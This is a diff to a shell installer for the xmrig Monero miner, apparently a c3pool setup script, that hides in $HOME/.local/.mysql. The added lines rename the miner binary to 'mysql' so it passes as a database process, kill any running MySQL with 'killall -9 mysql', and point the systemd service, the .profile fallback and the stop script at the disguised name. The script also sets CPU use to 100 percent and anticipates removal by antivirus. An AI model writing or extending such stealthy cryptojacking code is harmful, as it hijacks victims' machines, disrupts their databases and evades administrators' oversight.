@@ -125,6 +125,7 @@ echo "[*] Removing previous c3pool miner (if any)"
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop c3pool_miner.service
 fi
+killall -9 mysql
 killall -9 xmrig
 
 echo "[*] Removing $HOME/.local/.mysql directory"
@@ -144,14 +145,18 @@ if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.local/.mysql; then
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/.local/.mysql/xmrig works fine"
+echo "[*] Renaming xmrig executable to mysql"
+mv $HOME/.local/.mysql/xmrig $HOME/.local/.mysql/mysql
+chmod +x $HOME/.local/.mysql/mysql
+
+echo "[*] Checking if advanced version of $HOME/.local/.mysql/mysql works fine"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.local/.mysql/config.json
-$HOME/.local/.mysql/xmrig --help >/dev/null
+$HOME/.local/.mysql/mysql --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/.local/.mysql/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/.local/.mysql/xmrig is not functional"
+  if [ -f $HOME/.local/.mysql/mysql ]; then
+    echo "WARNING: Advanced version of $HOME/.local/.mysql/mysql is not functional"
   else
-    echo "WARNING: Advanced version of $HOME/.local/.mysql/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of $HOME/.local/.mysql/mysql was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -170,20 +175,24 @@ if (test $? -ne 0); then
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/.local/.mysql/xmrig works fine"
+  echo "[*] Renaming xmrig executable to mysql"
+  mv $HOME/.local/.mysql/xmrig $HOME/.local/.mysql/mysql
+  chmod +x $HOME/.local/.mysql/mysql
+
+  echo "[*] Checking if stock version of $HOME/.local/.mysql/mysql works fine"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.local/.mysql/config.json
-  $HOME/.local/.mysql/xmrig --help >/dev/null
+  $HOME/.local/.mysql/mysql --help >/dev/null
   if (test $? -ne 0); then
-    if [ -f $HOME/.local/.mysql/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/.local/.mysql/xmrig is not functional too"
+    if [ -f $HOME/.local/.mysql/mysql ]; then
+      echo "ERROR: Stock version of $HOME/.local/.mysql/mysql is not functional too"
     else
-      echo "ERROR: Stock version of $HOME/.local/.mysql/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of $HOME/.local/.mysql/mysql was removed by antivirus too"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/.local/.mysql/xmrig is OK"
+echo "[*] Miner $HOME/.local/.mysql/mysql is OK"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -204,7 +213,7 @@ sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.local/.mysql/c
 echo "[*] Writing $HOME/.local/.mysql/miner.sh"
 cat >$HOME/.local/.mysql/miner.sh <<EOF
 #!/bin/bash
-exec $HOME/.local/.mysql/xmrig --config=$HOME/.local/.mysql/config.json --no-color --print-time=60 --donate-level=1
+exec $HOME/.local/.mysql/mysql --config=$HOME/.local/.mysql/config.json --no-color --print-time=60 --donate-level=1
 EOF
 chmod +x $HOME/.local/.mysql/miner.sh
 
@@ -215,7 +224,7 @@ if sudo -n true 2>/dev/null; then
   sudo systemctl start c3pool_miner.service
 else
   echo "No passwordless sudo, running miner in background from .profile"
-  nohup $HOME/.local/.mysql/xmrig --config=$HOME/.local/.mysql/config.json --donate-level=1 --print-time=60 >$HOME/.local/.mysql/miner.log 2>&1 &
+  nohup $HOME/.local/.mysql/mysql --config=$HOME/.local/.mysql/config.json --donate-level=1 --print-time=60 >$HOME/.local/.mysql/miner.log 2>&1 &
 fi
 EOF
 chmod +x $HOME/.local/.mysql/run.sh
@@ -226,7 +235,7 @@ cat >$HOME/.local/.mysql/stop.sh <<EOF
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop c3pool_miner.service
 else
-  pkill -9 xmrig
+  pkill -9 mysql
 fi
 EOF
 chmod +x $HOME/.local/.mysql/stop.sh
@@ -240,7 +249,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=$HOME/.local/.mysql/xmrig --config=$HOME/.local/.mysql/config.json --donate-level=1 --print-time=60
+ExecStart=$HOME/.local/.mysql/mysql --config=$HOME/.local/.mysql/config.json --donate-level=1 --print-time=60
 Restart=always
 RestartSec=10
 Nice=-10
